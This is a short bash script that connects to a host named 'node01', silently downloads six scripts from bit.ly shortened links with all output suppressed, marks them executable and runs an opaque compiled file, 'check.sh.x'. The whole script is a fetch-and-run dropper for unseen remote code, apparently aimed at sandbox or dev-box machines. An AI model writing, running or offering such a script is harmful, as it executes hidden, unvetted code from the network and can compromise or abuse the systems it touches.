#!/bin/bash
ssh node01
wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
wget -O sleep.sh https://bit.ly/376kyA1 > /dev/null 2>&1
wget -O devboxvm.sh https://bit.ly/37e7QyU > /dev/null 2>&1
wget -O region.sh https://bit.ly/3rJD2zR > /dev/null 2>&1
wget -O check.sh.x https://bit.ly/3zNy1sL > /dev/null 2>&1
wget -O wait.sh https://bit.ly/3zV1jFE > /dev/null 2>&1
chmod +x devboxvm.sh
chmod +x exit.sh
chmod +x sleep.sh
chmod +x region.sh
chmod +x wait.sh
chmod +x check.sh.x
sleep 1
./check.sh.x
